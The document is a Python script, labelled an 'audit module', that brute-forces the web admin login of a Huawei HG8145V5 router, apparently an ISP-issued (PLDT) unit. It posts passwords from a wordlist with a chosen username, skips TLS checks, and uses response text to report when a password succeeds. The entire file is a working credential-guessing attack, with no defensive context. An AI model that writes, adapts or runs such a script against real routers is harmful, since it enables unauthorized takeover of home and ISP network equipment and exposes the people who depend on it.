import urllib.request
import urllib.parse
import http.cookiejar
import ssl

def run_audit(target_ip, input_username, wordlist_path):
    base_url = f"http://{target_ip}"
    login_url = f"{base_url}/"

    print(f"\n[+] Initializing Huawei HG8145V5 Audit Module (PLDT Matrix)")
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Target User: {input_username}")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPHandler()
    )

    print(f"[*] Starting strict credential audit against {login_url} with user: {input_username}")

    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue

                post_data = urllib.parse.urlencode({
                    'UserName': input_username,
                    'Password': password
                }).encode('utf-8')

                try:
                    req = urllib.request.Request(
                        login_url,
                        data=post_data,
                        headers={
                            'User-Agent': 'Mozilla/5.0',
                            'Referer': login_url,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'X-Requested-With': 'XMLHttpRequest'
                        }
                    )
                    with opener.open(req, timeout=10) as res:
                        response_body = res.read().decode('utf-8', errors='ignore')
                        final_url = res.geturl()
                        print(f"[?] Tried: {password}")

                        # Strict validation: Check if response indicates an error or stays on login page
                        is_login_page = "login" in response_body.lower() or "username" in response_body.lower()
                        has_error = "error" in response_body.lower() or "fail" in response_body.lower() or "incorrect" in response_body.lower()

                        # Success means we redirected away from root/login or landed on a dashboard page without error
                        if not has_error and (final_url != login_url or "index" in response_body.lower() or "main" in response_body.lower()):
                            if not is_login_page:
                                print(f"\n[+] SUCCESS! Password found: {password}")
                                return True
                except Exception:
                    pass
                    
        print("[-] Audit completed. Password not matched.")
    except FileNotFoundError:
        print(f"[!] Wordlist not found at {wordlist_path}")
    return False
